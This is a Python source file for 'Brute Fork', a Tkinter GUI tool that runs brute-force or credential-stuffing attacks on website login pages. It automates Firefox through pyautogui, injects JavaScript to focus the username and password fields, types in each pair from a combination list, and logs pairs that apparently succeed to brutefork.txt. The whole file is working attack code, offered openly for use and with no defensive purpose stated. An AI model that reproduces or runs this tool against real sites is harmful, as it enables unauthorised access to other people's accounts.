import time
import webbrowser
import pyperclip
import tkinter as tk
from tkinter import filedialog
from tkinter import PhotoImage
import pyautogui
import requests
from bs4 import BeautifulSoup

file = None
response = None
url = None
tab_title = None
website = None
speed_value = 1


def open_file():
    global file
    file = filedialog.askopenfilename()
    web_info_label.config(text="Now type in the website you want to attack", font=("Helvetica", 12))
    website_entry.grid(row=7, column=1)
    run_button.grid(row=8, column=1)
    info_label.config(text="NOTE: be sure to type the website login page into the box below.\nIf you don't know it, find it then copy and paste it in below.", font=("Helvetica", 9))


def status_code_request():
    global response, url
    time.sleep(2*speed_value)
    pyautogui.hotkey('ctrl', 'l')
    pyautogui.hotkey('ctrl', 'c')
    pyautogui.press('esc')
    url = pyperclip.paste()
    try:
        response = requests.get(url)
        print(f"The HTTP request code is: {response.status_code} ({url})")
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        create_popup("Checkpoint", "CHECKPOINT\n\nCheck to make sure you didn't misspell anything.", ["Ok"])


def check_tab_title():
    global tab_title
    soup = BeautifulSoup(response.text, "html.parser")
    tab_title = soup.title.text


def seek_login_page():
    global file, website, website_entry, response
    if not file:
        raise Exception("Please select a dictionary file.")
    website = website_entry.get()
    firefox_path = r'C:\Program Files\Mozilla Firefox\firefox.exe'
    webbrowser.register('firefox',None,webbrowser.BackgroundBrowser(firefox_path))
    webbrowser.get('firefox').open(website)
    status_code_request()
    create_popup("Checkpoint", "CHECKPOINT:\n\nIs this the login page?\n\nIf it is, click yes and begin the brute force attack.", ["Yes", "No"])


def seek_userbox():
    pyautogui.hotkey('ctrl', 'shift', 'k')
    time.sleep(0.9*speed_value)
    js_insert = """
    if (document.getElementById('email')) {
        var element = 'email';
    } else if (document.getElementById('username')) {
        var element = 'username';
    } else if (document.getElementById('emailAddressInput')) {
        var element = 'emailAddressInput';
    }
    const usrBox = document.getElementById(element);
    usrBox.focus();
    """
    pyautogui.typewrite(js_insert)
    time.sleep(1.5*speed_value)
    pyautogui.press('enter')
    pyautogui.press('f12')
    pyautogui.hotkey('ctrl', 'a')
    time.sleep(0.5*speed_value)


def seek_passbox():
    pyautogui.hotkey('ctrl', 'shift', 'k')
    time.sleep(1*speed_value)
    js_insert = """
    if (document.getElementById('password')) {
        var element = 'password';
    } else if (document.getElementById('passwordInput')) {
        var element = 'passwordInput';
    } else if (document.getElementById('pass')) {
        var element = 'pass';
    }
    const pwdBox = document.getElementById(element);
    pwdBox.focus();
    """
    pyautogui.typewrite(js_insert)
    time.sleep(0.8*speed_value)
    pyautogui.press('enter')
    pyautogui.press('f12')
    pyautogui.hotkey('ctrl', 'a')
    time.sleep(0.5*speed_value)


def start_brute():
    check_tab_title()
    login_title = tab_title
    print("This is the current tab: " + login_title)
    root.lift()
    time.sleep(0.5*speed_value)
    try:
        with open(file, "r") as dictionary:
            for line in dictionary:
                credentials = line.split(":")
                usr = credentials[0].strip()
                pwd = credentials[1].split()[0].strip()
                print(f"{usr} - {pwd}")
                seek_userbox()
                pyautogui.typewrite(usr)
                time.sleep(0.6*speed_value)
                seek_passbox()
                pyautogui.typewrite(pwd)
                time.sleep(0.5*speed_value)
                pyautogui.press('enter')
                time.sleep(1*speed_value)
                check_tab_title()
                if login_title != tab_title:
                    with open("brutefork.txt", "a") as newfile:
                        newfile.write(f"{usr} {pwd}\n")

                continue
    except Exception as e:
        print(e)
    pyautogui.hotkey('ctrl','w')
    create_popup("Checkpoint", "CHECKPOINT:\n\nThe attack is complete!\nWould you  like to continue?", ["Continue", "Quit"])


def create_popup(title, message, buttons):

    def button_ok():
        popup.destroy()
        pyautogui.hotkey('ctrl', 'w')
        root.lift()

    def button_yes():
        popup.destroy()
        start_brute()

    def button_no():
        popup.destroy()
        pyautogui.hotkey('ctrl', 'w')
        root.lift()

    def button_continue():
        popup.destroy()
        root.lift()

    def button_quit():
        popup.destroy()
        root.destroy()

    popup = tk.Toplevel(root)
    popup.title(title)
    popup.attributes("-topmost", True)
    label = tk.Label(popup, text=message)
    label.pack(padx=10, pady=10)
    for button_text in buttons:
        if button_text == "Yes":
            button_command = button_yes
        elif button_text == "No":
            button_command = button_no
        elif button_text == "Ok":
            button_command = button_ok
        elif button_text == "Continue":
            button_command = button_continue
        elif button_text == "Quit":
            button_command = button_quit
        button = tk.Button(popup, text=button_text, command=button_command)
        button.pack(pady=10)
    popup.update_idletasks()
    popup.geometry(
        f"{(popup.winfo_screenwidth() - popup.winfo_reqwidth()) // 2}+{(popup.winfo_screenheight() - popup.winfo_reqheight()) // 2}")


def main_menu():
    global root, web_info_label, website_entry, run_button, info_label, running_label
    root = tk.Tk()
    root.title("Brute Fork")
    root.geometry("485x575")
    bg_image = PhotoImage(file="bruteFork.png")
    bg_label = tk.Label(root, image=bg_image)
    bg_label.place(relwidth=1, relheight=1)
    root.grid_rowconfigure(11, weight=1)
    root.columnconfigure(0, weight=1)
    root.columnconfigure(1, weight=1)
    root.columnconfigure(2, weight=1)
    app_title_label = tk.Label(root, text="Main Menu", font=("Helvetica", 24))
    app_title_label.grid(row=1, column=1)
    title_info_label = tk.Label(root, text="This is a brute force application.\nStart by choosing your combination list file.", font=("Helvetica", 13))
    title_info_label.grid(row=2, column=1)
    browse_button = tk.Button(root, text="Choose File", command=open_file)
    browse_button.grid(row=3, column=1)
    web_info_label = tk.Label(root, text="")
    web_info_label.grid(row=4, column=1)
    removable_text = "example.com/login"
    website_entry = tk.Entry(root, width=40, fg="grey")
    website_entry.insert(0, "www." + removable_text)

    def clear_default_text(event):
        current_text = website_entry.get()
        if removable_text in current_text:
            new_text = current_text.replace(removable_text, "")
            website_entry.delete(0, tk.END)
            website_entry.config(fg="black")
            website_entry.insert(0, new_text)

    website_entry.bind("<FocusIn>", clear_default_text)
    website_entry.bind("<Return>", lambda event=None: seek_login_page())
    run_button = tk.Button(root, text="Search", command=seek_login_page)
    info_label = tk.Label(root, text="")
    info_label.grid(row=6, column=1)
    disclaimer_label = tk.Label(root, text="Disclaimer: make sure you have Firefox downloaded", font=("Helvetica", 8))
    disclaimer_label.grid(row=13, column=1)

    def set_speed():
        global speed_value
        speed_value = 1 if speed_value == 2.4 else 2.4
        normal_button.config(state='normal' if speed_value == 2.4 else 'disabled')
        slower_button.config(state='disabled' if speed_value == 2.4 else 'normal')

    normal_button = tk.Button(root, text='Normal', state='disabled', command=lambda: set_speed())
    normal_button.grid(row=12, column=0, padx=5, pady=5)
    slower_button = tk.Button(root, text='Slower', command=lambda: set_speed())
    slower_button.grid(row=13, column=0, padx=5, pady=5)
    force_quit_button = tk.Button(root, text="Force Quit", command=root.destroy)
    force_quit_button.grid(row=12, column=2, padx=5, pady=5)
    root.mainloop()


if __name__ == "__main__":
    main_menu()